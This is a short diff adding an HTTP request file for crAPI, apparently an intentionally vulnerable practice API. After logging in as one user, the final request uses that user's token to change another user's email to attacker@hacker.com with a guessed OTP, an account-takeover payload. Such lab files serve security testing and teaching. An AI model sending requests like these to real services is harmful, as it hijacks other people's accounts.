@@ -1,0 +1,25 @@
+POST /api/v2/user/login HTTP/1.1
+Host: crapi.local
+Content-Type: application/json
+
+{
+    "email": "normal_user@example.com",
+    "password": "SecurePassword123"
+}
+###
+GET /api/v2/products/15 HTTP/1.1
+Host: crapi.local
+Authorization: Bearer session_token_for_user_A
+###
+POST /api/v2/user/change_email HTTP/1.1
+Host: crapi.local
+Authorization: Bearer session_token_for_user_A
+Content-Type: application/json
+
+{
+    "user_id": "user_B_id_9948",
+    "new_email": "attacker@hacker.com",
+    "otp_code": "1234"
+}
+
+
